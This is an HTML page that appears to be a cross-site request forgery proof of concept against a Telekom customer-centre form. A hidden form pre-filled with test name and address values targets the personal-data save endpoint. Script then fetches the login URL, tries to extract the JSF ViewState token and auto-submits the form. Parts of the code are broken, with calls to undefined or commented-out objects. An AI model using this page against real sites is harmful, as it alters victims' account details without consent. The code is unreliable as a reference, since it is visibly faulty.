<html>
<body onload="getData()">

<form id="form" action="https://meinkonto.telekom-dienste.de/kundencenter/daten.xhtml" method="POST">
  <input type="hidden" name="javax.faces.partial.ajax" value="true"/>
  <input type="hidden" name="javax.faces.source" value="j_idt53:j_idt116:j_idt120:personDataSave"/>
  <input type="hidden" name="javax.faces.partial.execute" value="@all"/>
  <input type="hidden" name="javax.faces.partial.render" value="@none"/>
  <input type="hidden" name="j_idt53" value="j_idt53"/>
  <input type="hidden" name="j_idt53:j_idt116:j_idt120:personDataSave" value="j_idt53:j_idt116:j_idt120:personDataSave"/>
  <input type="hidden" name="j_idt53:j_idt74:j_idt76:salutation" value=""/>
  <input type="hidden" name="j_idt53:j_idt74:j_idt82:firstname" value="bwahahaha"/>
  <input type="hidden" name="j_idt53:j_idt74:j_idt86:lastname" value="testingra"/>
  <input type="hidden" name="j_idt53:j_idt74:j_idt90:street" value="test"/>
  <input type="hidden" name="j_idt53:j_idt74:j_idt94:zipcode" value="12121"/>
  <input type="hidden" name="j_idt53:j_idt74:j_idt98:city" value="testingcity"/>
  <input type="hidden" name="j_idt53:j_idt74:j_idt102:country" value="AX"/>
  <input type="hidden" id="findtoken" name="javax.faces.ViewState" value=""/>
  <input type="submit" value="Test"/>
</form>
</body>
<script>
/*
var x = new XMLHttpRequest();
function getData() {
 // x.withCredentials = true;
  x.open('POST','https://login.t-online.de/?returnToUrl=https%3A%2F%2Fmeinkonto.telekom-dienste.de%2Fkundencenter%2Fdaten.xhtml%3Fjavax.faces.partial.ajax%3Dtrue%26javax.faces.source%3Dj_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%26javax.faces.partial.execute%3D%40all%26javax.faces.partial.render%3D%40none%26j_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%3Dj_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%26j_idt53%3Dj_idt53%26j_idt53%3Aj_idt74%3Aj_idt76%3Asalutation%3D%26j_idt53%3Aj_idt74%3Aj_idt82%3Afirstname%3Dbwahahaha%26j_idt53%3Aj_idt74%3Aj_idt86%3Alastname%3Dtestingra%26j_idt53%3Aj_idt74%3Aj_idt90%3Astreet%3Dtest%26j_idt53%3Aj_idt74%3Aj_idt94%3Azipcode%3D12121%26j_idt53%3Aj_idt74%3Aj_idt98%3Acity%3Dtest%26j_idt53%3Aj_idt74%3Aj_idt102%3Acountry%3DAX',true);
  x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  x.send(data); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
   // let demoJSON = {
     // field: x.responseText.match(/id="j_id1:javax.faces.ViewState:0" value="(.+)"/)[1]
    //}
    //token = demoJSON.field.replace(/(<([^>]+)>)/ig, "");
    var token = x.responseText.getElementsByTagName('partial-response')[1];
   // token.replace(/<update id="j_id1:javax.faces.ViewState:0">/, "");
    var y = token.childNodes[0];
    var test = y.replace('<\![CDATA[ ',' ]]>', "");
    var token2 = encodeURI(test);
    document.getElementById("findtoken").value = token2;
    document.getElementById("form").submit();
  }
}
*/
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        myFunction(this);
    }
};

xhttp.open("POST", "https://login.t-online.de/?returnToUrl=https%3A%2F%2Fmeinkonto.telekom-dienste.de%2Fkundencenter%2Fdaten.xhtml%3Fjavax.faces.partial.ajax%3Dtrue%26javax.faces.source%3Dj_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%26javax.faces.partial.execute%3D%40all%26javax.faces.partial.render%3D%40none%26j_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%3Dj_idt53%3Aj_idt116%3Aj_idt120%3ApersonDataSave%26j_idt53%3Dj_idt53%26j_idt53%3Aj_idt74%3Aj_idt76%3Asalutation%3D%26j_idt53%3Aj_idt74%3Aj_idt82%3Afirstname%3Dbwahahaha%26j_idt53%3Aj_idt74%3Aj_idt86%3Alastname%3Dtestingra%26j_idt53%3Aj_idt74%3Aj_idt90%3Astreet%3Dtest%26j_idt53%3Aj_idt74%3Aj_idt94%3Azipcode%3D12121%26j_idt53%3Aj_idt74%3Aj_idt98%3Acity%3Dtest%26j_idt53%3Aj_idt74%3Aj_idt102%3Acountry%3DAX", true);
x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhttp.send();
  
function myFunction(xml) {
    var xmlDoc = xml.responseXML;
    var x = xmlDoc.getElementsByTagName('update')[1];
    var y = x.childNodes[0];
    var test = y.replace('<\![CDATA[ ',' ]]>', "");
    var token2 = encodeURI(test);
    document.getElementById("findtoken").innerHTML = token2.nodeValue; 
    document.getElementById("form").submit();
}

</script>
</html>
